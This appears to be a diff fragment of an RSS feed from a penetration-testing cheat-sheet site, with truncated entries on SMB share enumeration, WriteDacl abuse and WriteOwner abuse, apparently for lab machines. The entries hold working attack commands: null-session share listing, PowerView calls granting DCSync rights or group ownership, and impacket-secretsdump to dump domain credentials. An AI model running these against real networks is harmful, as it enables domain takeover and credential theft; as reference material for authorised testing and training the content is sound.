+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/smb_enum/</guid>
+      <description>SMB Share Enum nmap script sudo nmap --script=smb-enum-shares -p 445 10.10.11.10 Login without password smbmap smbmap -H 10.10.11.10 --no-banner smbmap -H 10.10.11.10 -u null --no-banner # List known share smbmap -H 10.10.11.10 -r &amp;#39;share&amp;#39; smbclient smbclient -N -L \\\\10.10.11.10\\ # After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\10.10.11.10\\ --option=&amp;#39;client min protocol=NT1&amp;#39; Login with password smbmap smbmap -H 10.</description>
+    </item>
+    <item>
       <title>WriteDacl</title>
       <link>https://tldrbins.github.io/writedacl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/writedacl/</guid>
       <description> Add dcsync right to user . .\PowerView.ps1 Authenticated Add-DomainObjectAcl -PrincipalIdentity &amp;#39;USER&amp;#39; -TargetIdentity &amp;#39;EXAMPLE.COM\Domain Admins&amp;#39; -Rights DCSync Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Add-DomainObjectAcl -PrincipalIdentity &amp;#39;USER&amp;#39; -TargetIdentity &amp;#39;EXAMPLE.COM\Domain Admins&amp;#39; -Rights DCSync -Credential $Cred Dcsync attack impacket-secretsdump username:password@10.10.11.10 </description>
+    </item>
+    <item>
+      <title>WriteOwner/Own</title>
+      <link>https://tldrbins.github.io/writeowner/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writeowner/</guid>
+      <description>Import PowerView.ps1 . .\PowerView.ps1 Abuse #1 : Change owner of the group (From Windows) Set-DomainObjectOwner -Identity &amp;lt;TARGET_GROUP&amp;gt; -OwnerIdentity &amp;lt;USERNAME&amp;gt; Abuse #2 : Add user to the group (From Windows) Authenticated Add-DomainObjectAcl -TargetIdentity &amp;lt;TARGET_GROUP&amp;gt; -PrincipalIdentity &amp;lt;USERNAME&amp;gt; -Rights All -DomainController &amp;lt;DC&amp;gt; Add-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Members &amp;lt;USERNAME&amp;gt; Runas $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential(&amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39;, $password) Add-DomainObjectAcl -TargetIdentity &amp;lt;TARGET_GROUP&amp;gt; -PrincipalIdentity &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -Rights All -DomainController &amp;lt;DC&amp;gt; -Credential $cred Add-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Members &amp;lt;USERNAME&amp;gt; -Credential $cred Check Get-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Domain &amp;lt;DOMAIN&amp;gt; -DomainController &amp;lt;DC&amp;gt; -Credential $cred | fl MemberName # Or net user &amp;lt;USERNAME&amp;gt; # Exit current sessions or re-login whoami /groups Abuse #2 : Add user to the group (From Linux) 0.</description>
     </item>
   </channel>
 </rss>
